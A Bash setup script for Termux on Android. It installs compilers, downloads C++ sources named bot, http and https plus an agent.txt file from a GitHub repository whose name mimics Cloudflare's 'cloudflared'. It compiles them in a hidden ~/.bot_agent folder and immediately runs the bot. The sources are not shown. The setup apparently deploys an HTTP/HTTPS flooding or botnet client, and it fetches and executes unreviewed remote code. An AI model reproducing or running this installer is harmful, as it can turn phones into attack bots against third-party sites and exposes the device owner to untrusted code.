#!/data/data/com.termux/files/usr/bin/bash
# Bot Setup Script for Termux (Pure Bash - No Node.js Required)
# Automatically installs clang/make if missing, downloads sources,
# compiles natively for Android ARM/ARM64, and runs the bot.

set -e

REPO_BASE="https://raw.githubusercontent.com/cloudflared9-hub/agent/main"
TARGET_DIR="${HOME}/.bot_agent"

echo "[+] Initializing Termux Bot Setup in: ${TARGET_DIR}"
mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

# 1. Check and install clang/make/curl via pkg
MISSING_PKGS=""
if ! command -v clang++ >/dev/null 2>&1; then
    MISSING_PKGS="${MISSING_PKGS} clang"
fi
if ! command -v make >/dev/null 2>&1; then
    MISSING_PKGS="${MISSING_PKGS} make"
fi
if ! command -v curl >/dev/null 2>&1; then
    MISSING_PKGS="${MISSING_PKGS} curl"
fi

if [ -n "${MISSING_PKGS}" ]; then
    echo "[*] Installing required packages:${MISSING_PKGS}..."
    pkg update -y -o Dpkg::Options::="--force-confnew" >/dev/null 2>&1 || true
    pkg install -y ${MISSING_PKGS}
fi

# 2. Download source files and agent.txt
echo "[*] Downloading sources from repository..."
curl -s -L "${REPO_BASE}/bots/bot.cpp?t=$(date +%s)" -o bot.cpp
curl -s -L "${REPO_BASE}/bots/http.cpp?t=$(date +%s)" -o http.cpp
curl -s -L "${REPO_BASE}/bots/https.cpp?t=$(date +%s)" -o https.cpp
curl -s -L "${REPO_BASE}/agent.txt?t=$(date +%s)" -o agent.txt

# 3. Compile sources natively for Termux architecture
echo "[*] Compiling bot binaries for $(uname -m)..."
clang++ -O2 -o bot bot.cpp
clang++ -O2 -pthread -o http http.cpp
clang++ -O2 -pthread -o https https.cpp

chmod +x bot http https

echo "[+] Compilation successful!"
echo "[+] Starting Bot process..."
./bot
